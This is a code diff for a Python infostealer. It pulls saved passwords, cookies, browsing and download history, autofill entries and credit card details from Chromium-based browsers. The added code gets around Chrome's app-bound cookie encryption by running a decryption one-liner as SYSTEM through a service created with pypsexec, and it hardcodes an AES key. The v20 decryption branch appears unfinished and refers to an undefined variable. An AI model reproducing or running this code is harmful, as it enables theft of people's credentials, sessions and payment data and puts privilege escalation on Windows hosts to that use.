@@ -1,3 +1,4 @@
+from sys import executable
 from os import remove, environ, makedirs
 from os.path import join, exists
 from glob import glob
@@ -11,15 +12,17 @@ from sqlite3 import connect
 from Crypto.Cipher import AES
 from datetime import datetime, timedelta
 from preferences.config import config
+from binascii import a2b_base64, b2a_base64
+from pypsexec.client import Client
 
-logins = ''''''
-cookies = ''''''
+logins = ""
+cookies = ""
 cookies_list = []
-history = ''''''
-downhistory = ''''''
-cards = ''''''
-autofills = ''''''
-msgInfo = ''''''
+history = ""
+downhistory = ""
+cards = ""
+autofills = ""
+msgInfo = ""
 
 class Types:
     class Cookie:
@@ -96,33 +99,63 @@ class Types:
         def __str__(self):
             return f"Name On Card: {self.name}\nCard Number: {self.number}\nExpires On: {self.exp_mth} / {self.exp_year}\nAdded On: {datetime.fromtimestamp(self.added_date)}"
 
-def get_master_key(path: str) -> bytes:
-    if not exists(path):
-        return None
+def get_keys(path: str) -> tuple[bytes, bytes]:
+    arguments = "-c \"" + """import win32crypt
+import binascii
+encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
+print(binascii.b2a_base64(encrypted_key[1]).decode())
+""".replace("\n", ";") + "\""
+
     local_state_path = join(path, "Local State")
     if not exists(local_state_path):
         return None
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        c = f.read()
-    if 'os_crypt' not in c:
-        return None
+    
+    with open(local_state_path, "r", encoding="utf-8") as f: c = f.read()
     local_state = json.loads(c)
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+
     try:
+        master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
         master_key = CryptUnprotectData(master_key, Flags=0)[1]
-        return master_key
-    except Exception as e: Log(f"{path} Local State ---> {e}")
+    except Exception as e: Log(f"{path} Local State (V10/V11) ---> {e}")
+
+    sys_client = Client("localhost")
+    try:
+        appb_key = b64decode(local_state["os_crypt"]["app_bound_encrypted_key"])
+        if appb_key[:4] != b"APPB": raise Exception("Invalid V20 key")
+
+        sys_client.connect(timeout=10)
+        sys_client.create_service()
+
+        encrypted_key_b64, stderr, rc = sys_client.run_executable(
+            executable=executable,
+            arguments=arguments.format(appb_key[4:].strip()),
+            use_system_account=True
+        )
+
+        appb_key = CryptUnprotectData(encrypted_key_b64.decode(), Flags=0)[1][-61:]
+        if appb_key[0] != 1: raise Exception("Decrypt failed")
+        return appb_key
         
+    except Exception as e: Log(f"{path} Local State (V20) ---> {e}")
+    finally:
+        sys_client.remove_service()
+        sys_client.cleanup()
+        sys_client.disconnect()
 
-def decrypt_password(buff: bytes, master_key: bytes) -> str:
-    if buff[:3] != bytes.fromhex("71 31 30"): raise Exception("Not V10 encryption")
-    iv = buff[3:15]
-    payload = buff[15:-16]
-    tag = buff[-16:]
-    cipher = AES.new(master_key, AES.MODE_GCM, iv)
-    decrypted_pass = cipher.decrypt_and_verify(payload, tag)
-    return decrypted_pass.decode("utf-8")
 
+def decrypt_password(buff: bytes, master_key: bytes, appbound_key: bytes) -> str:
+    if buff[:2] == b"v1":
+        iv = buff[3:15]
+        payload = buff[15:-16]
+        tag = buff[-16:]
+        cipher = AES.new(master_key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt_and_verify(payload, tag)
+        return decrypted_pass.decode("utf-8")
+    elif buff[:3] == b"v20":
+        aes_key = a2b_base64("sxxuJBrIRnKNqcH6xJNmUc/7lE0UOrgWJ2vMbaAoR4c=")
+        iv = decrypted_key[1:1+12]
+        ciphertext = decrypted_key[1+12:1+12+32]
+        tag = decrypted_key[1+12+32:]
 
 def get_login_data(path, master_key, blink = False):
     try:
@@ -196,7 +229,7 @@ def get_downloads(path, blink = False):
     except Exception as e:
         Log(f"{path} downhistory ---> {e}")
 
-def get_cookies(path, master_key, blink = False):
+def get_cookies(path, master_key, appb_key, blink = False):
     global cookies
     global cookies_list
     try:
@@ -375,7 +408,7 @@ def Chromium():
     }
 
     for key, value in browsers.items():
-        master_key = get_master_key(value)
+        master_key, appb_key = get_keys(value)
         matching_folders = glob(join(value, "Default"))
         buff = glob(join(value, "Profile*"))
         for profile in buff:
@@ -387,7 +420,7 @@ def Chromium():
                     get_login_data(profile_path, master_key)
                     get_web_history(profile_path)
                     get_downloads(profile_path)
-                    get_cookies(profile_path, master_key)
+                    get_cookies(profile_path, master_key, appb_key)
                     get_autofils(profile_path)
                     get_credit_cards(profile_path, master_key)
                 except Exception as error:
@@ -396,11 +429,11 @@ def Chromium():
             Write(pathToLogs, key)
     
     for key, value in blink_directory.items():
-        master_key = get_master_key(value)
+        master_key, appb_key = get_keys(value)
         get_login_data(value, master_key, True)
         get_web_history(value, True)
         get_downloads(value, True)
-        get_cookies(value, master_key, True)
+        get_cookies(value, master_key, appb_key, True)
         get_credit_cards(value, master_key, True)
         get_autofils(value, True)
         Write(pathToLogs, key)
